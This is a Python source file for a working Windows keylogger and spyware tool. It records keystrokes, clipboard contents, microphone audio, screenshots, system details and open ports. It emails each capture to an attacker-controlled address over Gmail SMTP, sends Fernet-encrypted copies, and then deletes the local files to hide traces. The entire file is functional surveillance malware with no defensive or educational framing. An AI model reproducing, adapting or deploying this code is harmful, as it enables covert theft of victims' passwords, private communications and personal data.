from credentials import email_address, password, toaddr
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from pathlib import Path

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from requests import get

from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminformation.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
port_information = "port_information.txt"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminformation.txt"
clipboard_information_e = "e_clipboard.txt"
port_information_e = "e_port_information.txt"

microphone_time = 10
time_iteration = 150
number_of_iterations_end = 1

data_folder = Path("D:/Keylogger/Cryptography")
file_to_open = data_folder / "encryption_key.txt"
f = open(file_to_open)
key=f.read()


file_path = "D:\\Keylogger\\Keylogger"
extend = "\\"
file_merge = file_path + extend

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Hacking"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octat-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)
    
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()


count = 0
keys = []

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


def port_info():

    with open(file_path + extend + port_information, "a") as f:
        ip = socket.gethostbyname(socket.gethostname())
        for port in range(65535):
            try:
                serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                serv.bind((ip, port))
            except:
                f.write("Open Port -> " + str(port) + "\n")
            serv.close()

port_info()

while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\t')
                    f.close()
                if k.find("enter") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        send_email(keys_information, file_path + extend + keys_information, toaddr)
        with open(file_path + extend + keys_information, "a") as f:
            f.write("\n")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        microphone()
        send_email(audio_information, file_path + extend + audio_information, toaddr)
        port_info()
        send_email(port_information, file_path + extend + port_information, toaddr)
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
        computer_information()
        send_email(system_information, file_path + extend + system_information, toaddr)

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information, file_merge + port_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e, file_merge + port_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information, port_information]
for file in delete_files:
    os.remove(file_merge + file)



